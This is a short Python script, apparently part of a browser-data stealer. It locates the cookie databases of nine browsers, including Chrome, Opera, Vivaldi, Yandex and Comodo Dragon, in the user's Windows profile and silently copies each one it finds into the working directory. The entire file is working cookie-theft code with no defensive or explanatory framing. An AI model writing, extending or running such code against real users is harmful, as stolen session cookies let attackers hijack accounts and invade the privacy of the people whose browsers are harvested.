# -*- coding: utf-8 -*-
"""
Created on Thu Jan 24 21:51:45 2019

"""

from os.path import expanduser
import os.path
import shutil

pathusr = expanduser('~').encode().decode('cp1251')

vivaldi = pathusr + r'''\AppData\Local\Vivaldi\User Data\Default\Cookies'''
chrome = pathusr + r'''\AppData\Local\Google\Chrome\User Data\Default\Cookies'''
yandex = pathusr + r'''\AppData\Local\Yandex\YandexBrowser\User Data\Default\Cookies'''
opera = pathusr + r'''\AppData\Roaming\Opera Software\Opera Stable\Cookies'''
kometa = pathusr + r'''\AppData\Local\Kometa\User Data\Default\Cookies'''
orbitum = pathusr + r'''\AppData\Local\Orbitum\User Data\Default\Cookies'''
comodo = pathusr + r'''\AppData\Local\Comodo\Dragon\User Data\Default\Cookies'''
amigo = pathusr + r'''\AppData\Local\Amigo\User\User Data\Default\Cookies'''
torch = pathusr + r'''\AppData\Local\Torch\User Data\Default\Cookies'''

databases = [vivaldi, chrome, yandex, opera, kometa, orbitum, comodo, amigo, torch]

i = 0
interation = 0

for data in databases:
    if os.path.exists(data):
        try:
            shutil.copy2(data, r'Cockie ' + str(i))
        except:
            continue
        i += 1

    else:
        continue
